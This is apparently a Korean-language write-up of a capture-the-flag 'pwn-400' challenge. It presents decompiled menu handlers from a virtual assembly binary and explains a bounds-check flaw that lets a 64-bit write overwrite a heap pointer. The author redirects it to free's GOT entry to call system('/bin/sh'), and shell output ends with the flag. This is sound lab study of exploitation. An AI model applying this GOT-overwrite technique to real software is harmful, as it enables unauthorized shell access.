## solve

#### menu
```
[1] mov dword register, register
[2] mov dword memory, register
[3] mov dword register, memory
[4] mov dword register, $data
[5] mov qword register, register
[6] mov qword memory, register
[7] mov qword register, memory
[8] mov qword register, $data
[9] sub register, register
[10] sub register, memory
[11] sub register, $data
[12] add register, register
[13] add register, memory
[14] add register, $data
[15] push $string
[16] push dword $data
[17] pop $string
[18] pop dword $data
[19] int 0x80
[20] Exit..
```
</br>

#### 8번 메뉴
``` c
//8번 메뉴
case 8:
  write(1, "Input dest : ", 0xDu);
  read(0, &s, 0x14u);
  while ( strcmp((&s1)[4 * v2], &s) )
  {
    if ( ++v2 > 7 )
    {
      write(1, "Can't find dest\n", 0x10u);
      return *MK_FP(__GS__, 20) ^ v10;
    }
  }
  if ( v2 <= 3 )
  {
    write(1, "You can only use 64-bit registers\n", 0x22u);
    return *MK_FP(__GS__, 20) ^ v10;
  }
  write(1, "Input data : ", 0xDu);
  __isoc99_scanf("%llu", &v6);
  sub_80488B6(8 * v2 + 134530304, v6);
  continue;  
```

* 8번 메뉴를 통해 rdx에 값을 저장할 수 있다. 

</br>

#### 6번 메뉴
``` c
//6번 메뉴
case 6:
  write(1, "Input dest : ", 0xDu);
  read(0, &s, 0x14u);
  v4 = strtoul(&s, 0, 16);
  if ( v4 < (unsigned int)&unk_804C0E0 || v4 > (unsigned int)&unk_804C4DC )
  {
    write(1, "Out-Of-Bounds!!\n", 0x10u);
    exit(0);
  }
  write(1, "Input source : ", 0xFu);
  read(0, &s2, 0x14u);
  while ( strcmp((&s1)[4 * v3], &s2) )
  {
    if ( ++v3 > 7 )
    {
      write(1, "Can't find source\n", 0x12u);
      return *MK_FP(__GS__, 20) ^ v10;
    }
  }
  if ( v3 <= 3 )
  {
    write(1, "You can only use 64-bit registers\n", 0x22u);
    return *MK_FP(__GS__, 20) ^ v10;
  }
  sub_8048858(v4, &dword_804C500[2 * v3]);
  continue;
```

* 여기서 레지스터에 있는 값을 메모리에 저장한다. 리틀엔디안 방식으로 저장이된다.

</br>

## Vulnerabilities
```
if ( v4 < (unsigned int)&unk_804C0E0 || v4 > (unsigned int)&unk_804C4DC )
```
* 6번 메뉴에서 범위를 검사하는데 0x804C4DC를 넘으면 안된다.</br>

```
buf = malloc(0x100u);
ptr = malloc(0x400u);
dword_804C4E0 = buf;
dword_804C4E4 = ptr;
```

* 바로 뒤의 804C4e0에는 buf의 주소인 힙의 주소가 저장되어 있는데, 만약 6번 메뉴에서 memory의 주소가 804C4DC로 지정을 하게되면 , 리틀엔디안 방식으로 edx가 아닌 rdx를 이용하기 때문에 804C4e0를 overwrite 할 수 있다.

* 따라서 804C4e0에 free함수의 got주소를 overwrite하고 난 뒤, modify메뉴를 이용해서 buf의 값은 system함수의 주소로, ptr의 값은 '/bin/sh\x00' 으로 수정한다. 그리고 종료를 하게 되면 free(ptr)이 호출되고, system('/bin/sh\x00') 이 호출된다.

</br>

## Result
```
~/machome/ctf/doubles_ctf/pwn-400(master*) » python exploit.py k                                     stitch@certis
 OK..
[ Virtual Assembly System ]
[1] Show Examples
[2] Generate Assembly
[3] Modify Name and Description
[4] Help
[5] Exit
-> $ 5
Bye Bye~~
\x00$ id
uid=1002(prob02) gid=1002(prob02) groups=1002(prob02)
$ ls /home/prob02
asm
flag
$ cat /home/prob02/flag
flag{4sm_1s_s0_h4rd}
$
```
